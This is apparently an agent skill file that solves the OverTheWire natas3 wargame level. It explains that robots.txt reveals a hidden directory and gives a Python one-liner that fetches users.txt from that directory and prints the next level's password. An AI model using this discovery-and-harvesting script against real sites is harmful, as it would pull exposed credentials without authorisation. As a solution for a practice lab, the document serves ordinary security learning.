---
name: natas-3
description: >-
  Use when solving OverTheWire natas3: given natas3 credentials, read robots.txt
  to find the disallowed directory, then read users.txt there to get the natas4
  password.
---
# natas3

**Input:** username and password for natas3.

**Weakness:** `robots.txt` discloses a hidden directory (`Disallow:` entry) that has directory listing enabled and holds a `users.txt` with the natas4 credentials. Robots.txt only asks crawlers to stay away; it doesn't protect anything.

**Network:** run on a host that can reach `natas3.natas.labs.overthewire.org`. On Windows PowerShell use `python` / `curl.exe`, not the `curl` alias.

## Steps

1. Derive the natas4 password (never hardcode it). The script reads robots.txt, takes the first `Disallow:` path, and fetches `users.txt` from it. Replace `USER` and `PASS` with the natas3 credentials:

```bash
python -c "import base64,re,urllib.request;u,p='USER','PASS';b='http://natas3.natas.labs.overthewire.org';h={'Authorization':'Basic '+base64.b64encode(f'{u}:{p}'.encode()).decode()};g=lambda x:urllib.request.urlopen(urllib.request.Request(b+x,headers=h),timeout=30).read().decode();d=re.search(r'Disallow:\s*(\S+)',g('/robots.txt')).group(1);print(re.search(r'^natas4:(\S+)',g(d+'users.txt'),re.M).group(1))"
```

2. The printed string is the natas4 password.

3. Confirm by GETting `http://natas4.natas.labs.overthewire.org/` with Basic Auth `natas4:<password>` and expecting HTTP 200.
